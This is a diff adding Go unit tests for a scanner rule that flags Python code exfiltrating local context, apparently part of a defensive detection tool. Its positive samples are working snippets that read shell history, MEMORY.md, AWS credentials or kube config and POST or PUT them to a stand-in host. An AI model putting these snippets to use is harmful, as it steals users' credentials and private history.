@@ -159,6 +159,120 @@ def execute():
 	}
 }
 
+func TestPythonContextExfil(t *testing.T) {
+	positives := []string{
+		`import json
+from pathlib import Path
+from urllib.request import Request, urlopen
+def collect():
+    for name in [".bash_history", ".zsh_history"]:
+        path = Path.home() / name
+        if path.exists():
+            lines = path.read_text().splitlines()
+    return {"history": lines}
+def send(payload):
+    body = json.dumps(payload).encode()
+    req = Request("https://events.example/collect", data=body, method="POST")
+    urlopen(req)
+send(collect())`,
+		`import requests
+from pathlib import Path
+history = (Path.home() / ".python_history").read_text()
+requests.post("https://events.example/collect", json={"history": history})`,
+		`import httpx as client
+from pathlib import Path
+memory = (Path.home() / "MEMORY.md").read_text()
+client.put("https://events.example/context", content=memory)`,
+		`import urllib.request
+from pathlib import Path
+credentials = (Path.home() / ".aws/credentials").read_bytes()
+urllib.request.urlopen("https://events.example/context", data=credentials)`,
+		`from requests import patch as send
+from pathlib import Path
+cfg = open(Path.home() / ".kube/config").read()
+send("https://events.example/context", data=cfg)`,
+	}
+	for i, src := range positives {
+		if !hasRule(t, "scripts/diagnostics.py", src, RulePythonContextExfil) {
+			t.Errorf("positive %d did not fire", i)
+		}
+	}
+}
+
+func TestPythonContextExfilFalsePositives(t *testing.T) {
+	negatives := []string{
+		`from pathlib import Path
+history = (Path.home() / ".bash_history").read_text()
+print(len(history))`,
+		`import requests
+requests.post("https://events.example/health", json={"status": "ok"})`,
+		`import requests
+from pathlib import Path
+config = Path(".env").read_text()
+requests.post("https://api.example/deploy", data=config)`,
+		`import requests
+from pathlib import Path
+history = (Path.home() / ".bash_history").read_text()
+requests.get("https://events.example/schema")`,
+		`import requests
+requests.post("https://events.example/health")
+history = open(".bash_history").read()`,
+		`# requests.post("https://events.example/collect")
+history = open(".bash_history").read()`,
+		`"""Example: read ~/.bash_history and POST it with requests."""
+print("diagnostics disabled")`,
+		`class Client:
+    def post(self, url, data=None):
+        return None
+from pathlib import Path
+history = (Path.home() / ".bash_history").read_text()
+Client().post("https://events.example/collect", data=history)`,
+		`from pathlib import Path
+path = Path.home() / ".bash_history"
+print(path)`,
+		`from urllib.request import Request, urlopen
+from pathlib import Path
+history = (Path.home() / ".bash_history").read_text()
+req = Request("https://events.example/schema")
+urlopen(req)`,
+		`from pathlib import Path
+path = Path.home() / ".bash_history"
+path = Path("/tmp/reviewed.log")
+contents = path.read_text()
+import requests
+requests.post("https://events.example/collect", data=contents)`,
+		`from pathlib import Path
+history = (Path.home() / ".bash_history").read_text()
+requests.post("https://events.example/collect", data=history)
+import requests`,
+		`import requests
+from pathlib import Path
+history = (Path.home() / ".bash_history").read_text()
+requests = Client()
+requests.post("https://events.example/collect", data=history)`,
+		`import requests
+from pathlib import Path
+history = (Path.home() / ".bash_history.example").read_text()
+requests.post("https://events.example/collect", data=history)`,
+		`import requests
+from pathlib import Path
+example = ".bash_history"
+contents = reader.read()
+requests.post("https://events.example/collect", data=contents)`,
+		`from pathlib import Path
+history = (Path.home() / ".bash_history").read_text()
+def import_client():
+    import requests as client
+def send():
+    client.post("https://events.example/collect", data=history)`,
+	}
+	for i, src := range negatives {
+		if hasRule(t, "scripts/diagnostics.py", src, RulePythonContextExfil) {
+			t.Errorf("negative %d fired", i)
+		}
+	}
+}
+
 func TestStructuredPythonPersistence(t *testing.T) {
 	src := `import subprocess
 from pathlib import Path
